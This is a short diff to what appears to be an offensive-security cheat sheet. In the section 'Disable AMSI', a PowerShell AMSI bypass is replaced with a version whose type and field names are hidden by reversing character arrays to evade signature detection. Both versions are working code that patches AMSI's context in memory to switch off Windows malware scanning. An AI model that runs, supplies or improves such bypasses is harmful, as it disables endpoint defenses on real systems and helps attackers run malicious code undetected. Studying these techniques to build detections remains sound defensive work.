@@ -9,7 +9,7 @@ Tools added:
 ## Disable AMSI
 
 ``` pwsh
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if($b.Name -Like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic, Static');Foreach($e in $d) {if($e.Name -Like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+$String1 = @('s','l','i','t','U','i','*');$String2 = @('t','x','e','t','n','o','C','*');[array]::Reverse($String1);[array]::Reverse($String2);$Ass=[Ref].Assembly.GetTypes();Foreach($SingleAss in $Ass) {if($SingleAss.Name -Like (-join($String1))){$Wildcard=$SingleAss}};$WildcardFields=$Wildcard.GetFields('NonPublic, Static');Foreach($WildcardObjects in $WildcardFields) {if($WildcardObjects.Name -Like (-join($String2))){$ObjectContext=$WildcardObjects}};$NullValue=$ObjectContext.GetValue($null);[IntPtr]$ptr=$NullValue;[Int32[]]$SingleAssuf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($SingleAssuf, 0, $ptr, 1);
 ```
 
 ## Run PowerShell script in memory
